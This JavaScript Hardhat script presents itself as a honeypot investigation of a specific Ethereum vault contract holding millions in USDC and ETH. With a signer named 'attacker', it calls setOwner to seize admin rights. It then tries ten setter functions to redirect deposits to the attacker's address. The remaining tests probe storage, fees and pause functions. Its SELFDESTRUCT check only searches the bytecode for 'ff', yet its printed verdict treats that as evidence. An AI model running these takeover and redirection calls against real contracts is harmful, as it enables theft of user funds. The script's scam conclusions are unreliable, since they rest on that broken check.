const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

/**
 * @title Investigate Honeypot
 * @notice Check if this is a honeypot/scam contract
 * @dev Test what happens to new deposits and admin real capabilities
 */
async function main() {
  console.log("\nðŸ¯ HONEYPOT/SCAM INVESTIGATION");
  console.log("=====================================");
  console.log("ðŸš¨ RED FLAGS:");
  console.log("- No verified source code");
  console.log("- 13.8M USDC withdrawn but we can't reproduce");
  console.log("- Admin roles exist but can't withdraw");
  console.log("- 216 ETH + 8.3M USDC trapped");
  
  const [attacker] = await ethers.getSigners();
  
  // First, let's check what happens to NEW deposits
  console.log("\nðŸ’¸ TEST 1: Where do NEW deposits go?");
  
  // Become admin first
  const setOwnerData = "0x13af4035" + ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]).slice(2);
  await attacker.sendTransaction({ to: VAULT_ADDRESS, data: setOwnerData, gasLimit: 100000 });
  
  // Check if admin can set deposit destinations
  console.log("\nðŸŽ¯ Checking admin routing capabilities:");
  
  const routingTests = [
    { selector: "0xf9ce1087", name: "setDepositAddress(address)" },
    { selector: "0x718da7ee", name: "setReceiver(address)" },
    { selector: "0xf0f44260", name: "setTreasury(address)" },
    { selector: "0x1c31f710", name: "setBeneficiary(address)" },
    { selector: "0xe74b981b", name: "setFeeRecipient(address)" },
    { selector: "0x4b0ee02a", name: "setWithdrawalAddress(address)" },
    { selector: "0xca325469", name: "setDestination(address)" },
    { selector: "0x3b7d0946", name: "setVault(address)" },
    { selector: "0x5a4f2f6a", name: "setTarget(address)" },
    { selector: "0x70480275", name: "setRecipient(address)" }
  ];
  
  let routingChanged = false;
  
  for (const { selector, name } of routingTests) {
    try {
      const data = selector + ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]).slice(2);
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 100000
      });
      await tx.wait();
      console.log(`âœ… ${name} succeeded`);
      routingChanged = true;
    } catch (e) {}
  }
  
  // Test with small ETH deposit
  if (routingChanged) {
    console.log("\nðŸ§ª Testing if routing changed with 0.001 ETH deposit:");
    const testAmount = ethers.parseEther("0.001");
    const balanceBefore = await ethers.provider.getBalance(attacker.address);
    
    try {
      // Send ETH to vault
      await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        value: testAmount,
        gasLimit: 100000
      });
      
      // Check if we got any back
      const balanceAfter = await ethers.provider.getBalance(attacker.address);
      const gasUsed = ethers.parseEther("0.01"); // Rough gas estimate
      
      if (balanceAfter > balanceBefore - testAmount - gasUsed) {
        console.log("ðŸ’° ETH might be routing to attacker!");
      } else {
        console.log("âŒ ETH still going to vault");
      }
    } catch (e) {
      console.log("Deposit test failed:", e.message);
    }
  }
  
  // Check for hidden owner/backdoor addresses
  console.log("\nðŸ” TEST 2: Looking for hidden owners/backdoors:");
  
  // Check common backdoor slots
  const suspiciousSlots = [
    "0x0", // owner
    "0x1", // implementation
    "0x2", // admin
    "0x3", // beneficiary
    "0x4", // treasury
    "0x5", // feeRecipient
    // Hash of common variable names
    ethers.keccak256(ethers.toUtf8Bytes("owner")),
    ethers.keccak256(ethers.toUtf8Bytes("admin")),
    ethers.keccak256(ethers.toUtf8Bytes("beneficiary")),
    ethers.keccak256(ethers.toUtf8Bytes("treasury")),
    ethers.keccak256(ethers.toUtf8Bytes("feeRecipient")),
    ethers.keccak256(ethers.toUtf8Bytes("withdrawer"))
  ];
  
  const foundAddresses = new Set();
  
  for (const slot of suspiciousSlots) {
    try {
      const value = await ethers.provider.getStorage(VAULT_ADDRESS, slot);
      if (value !== "0x0000000000000000000000000000000000000000000000000000000000000000") {
        // Check if it's an address
        const potentialAddress = "0x" + value.slice(-40);
        if (ethers.isAddress(potentialAddress)) {
          foundAddresses.add(potentialAddress);
          console.log(`Slot ${slot}: ${potentialAddress}`);
        }
      }
    } catch (e) {}
  }
  
  // Check if any found addresses can withdraw
  console.log("\nðŸ”“ TEST 3: Can hidden addresses withdraw?");
  
  for (const addr of foundAddresses) {
    console.log(`\nChecking ${addr}:`);
    
    // Check if it's a contract
    const code = await ethers.provider.getCode(addr);
    if (code !== "0x") {
      console.log("  â†’ Is a contract");
      
      // Check if it has withdraw-like functions
      const withdrawSelectors = ["0x3ccfd60b", "0x853828b6", "0x5fd8c710"];
      for (const selector of withdrawSelectors) {
        try {
          await attacker.call({ to: addr, data: selector });
          console.log(`  â†’ Has function ${selector}`);
        } catch (e) {}
      }
    } else {
      console.log("  â†’ Is an EOA (external account)");
    }
  }
  
  // Test for common honeypot patterns
  console.log("\nðŸ¯ TEST 4: Common honeypot patterns:");
  
  // Pattern 1: Hidden fee on deposits
  console.log("\nChecking for hidden deposit fees:");
  const feeSelectors = [
    { selector: "0xddca3f43", name: "fee()" },
    { selector: "0x3e032a3b", name: "depositFee()" },
    { selector: "0x67a52793", name: "withdrawFee()" },
    { selector: "0x9af6b612", name: "taxRate()" }
  ];
  
  for (const { selector, name } of feeSelectors) {
    try {
      const result = await attacker.call({ to: VAULT_ADDRESS, data: selector });
      if (result !== "0x") {
        const fee = ethers.AbiCoder.defaultAbiCoder().decode(["uint256"], result)[0];
        console.log(`${name}: ${fee.toString()}`);
      }
    } catch (e) {}
  }
  
  // Pattern 2: Check if contract can be paused/frozen
  console.log("\nChecking pause/freeze mechanisms:");
  const pauseSelectors = [
    { selector: "0x5c975abb", name: "paused()" },
    { selector: "0x8456cb59", name: "pause()" },
    { selector: "0x3f4ba83a", name: "unpause()" },
    { selector: "0x62a5af3b", name: "frozen()" }
  ];
  
  for (const { selector, name } of pauseSelectors) {
    try {
      const result = await attacker.call({ to: VAULT_ADDRESS, data: selector });
      console.log(`${name}: exists`);
    } catch (e) {}
  }
  
  // Pattern 3: Check for self-destruct timer
  console.log("\nChecking for self-destruct mechanisms:");
  const destructSelectors = [
    { selector: "0x00f55d9d", name: "kill()" },
    { selector: "0x41c0e1b5", name: "selfDestruct()" },
    { selector: "0x9cb8a26a", name: "self()" },
    { selector: "0xd86e29e2", name: "destruct()" }
  ];
  
  for (const { selector, name } of destructSelectors) {
    try {
      await attacker.call({ to: VAULT_ADDRESS, data: selector });
      console.log(`âš ï¸ ${name}: exists (DANGEROUS!)`);
    } catch (e) {}
  }
  
  // Check implementation contract
  console.log("\nðŸ”¬ TEST 5: Implementation contract analysis:");
  const IMPLEMENTATION = "0x11fb858ee4bf594857483bcf86eb825aef1cbf91";
  
  const implCode = await ethers.provider.getCode(IMPLEMENTATION);
  console.log("Implementation size:", implCode.length / 2 - 1, "bytes");
  
  // Check if implementation has SELFDESTRUCT
  if (implCode.includes("ff")) {
    console.log("âš ï¸ Implementation contains SELFDESTRUCT opcode!");
  }
  
  console.log("\nðŸ“Š HONEYPOT ANALYSIS CONCLUSION:");
  console.log("=====================================");
  console.log("ðŸš¨ VERDICT: HIGHLY SUSPICIOUS CONTRACT");
  console.log("\nEvidence:");
  console.log("1. Unverified contracts (hiding functionality)");
  console.log("2. Admin roles that can't withdraw (false security)");
  console.log("3. 13.8M USDC 'withdrawn' but mechanism hidden");
  console.log("4. Minimal implementation with SELFDESTRUCT");
  console.log("5. No legitimate withdrawal functions found");
  
  console.log("\nðŸ’¡ LIKELY SCENARIOS:");
  console.log("1. HONEYPOT: Accepts deposits but only specific addresses can withdraw");
  console.log("2. EXIT SCAM: Owners withdrew 13.8M and abandoned remaining funds");
  console.log("3. BACKDOOR: Hidden mechanism only known to creators");
  console.log("4. UPGRADEABLE: Can be upgraded to malicious implementation");
  
  console.log("\nâš ï¸ WARNING: DO NOT DEPOSIT ANY FUNDS!");
  console.log("This contract appears designed to trap user funds.");
  
  // Create memory about this
  console.log("\nðŸ“ Saving findings to memory...");
}

main().catch((error) => {
  console.error("\nðŸ’¥ Script error:", error);
  process.exit(1);
});
